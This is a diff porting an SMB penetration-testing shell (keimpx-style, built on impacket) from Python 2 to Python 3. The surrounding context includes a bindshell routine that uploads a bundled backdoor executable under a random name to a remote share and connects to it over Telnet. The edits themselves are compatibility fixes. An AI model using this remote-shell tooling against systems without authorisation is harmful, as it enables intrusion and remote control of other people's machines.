@@ -24,6 +24,7 @@ from lib.services import SvcCtl
 from lib.exceptions import missingShare, missingFile
 from telnetlib import Telnet
 from six import string_types
+from six.moves import range as range
 
 try:
     from impacket import nt_errors
@@ -414,6 +415,7 @@ class SMBShell(PsExec, Samr, SvcCtl):
             while 1:
                 try:
                     data = self.smb.readFile(self.tid, self.fid, offset)
+                    data = data.decode("cp437")
                     print(data)
                     if len(data) == 0:
                         break
@@ -521,7 +523,7 @@ class SMBShell(PsExec, Samr, SvcCtl):
                 logger.debug('Uploading file %s to %s..' % (filename, destfile))
 
             try:
-                self.smb.putFile(self.share, destfile.decode(sys.stdin.encoding), fp.read)
+                self.smb.putFile(self.share, destfile, fp.read)
             except SessionError as e:
                 traceback.print_exc()
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
@@ -592,9 +594,9 @@ class SMBShell(PsExec, Samr, SvcCtl):
 
     def bindshell(self, port):
         connected = False
-        srvname = ''.join([random.choice(string.letters) for _ in range(8)])
+        srvname = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
         local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
-        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in range(8)])
+        remote_file = '%s.exe' % ''.join([random.choice(string.ascii_lowercase) for _ in range(8)])
 
         if not os.path.exists(local_file):
             raise missingFile('srv_bindshell.exe not found in the contrib subfolder')
@@ -611,7 +613,7 @@ class SMBShell(PsExec, Samr, SvcCtl):
 
         logger.info('Connecting to backdoor on port %d, wait..' % port)
 
-        for counter in xrange(0, 3):
+        for counter in range(0, 3):
             try:
                 time.sleep(1)
 
@@ -624,7 +626,7 @@ class SMBShell(PsExec, Samr, SvcCtl):
                 tn.interact()
             except (socket.error, socket.herror, socket.gaierror, socket.timeout) as e:
                 if connected is False:
-                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e[1])
+                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e)
 
                     if counter < 2:
                         warn_msg += ', retrying..'
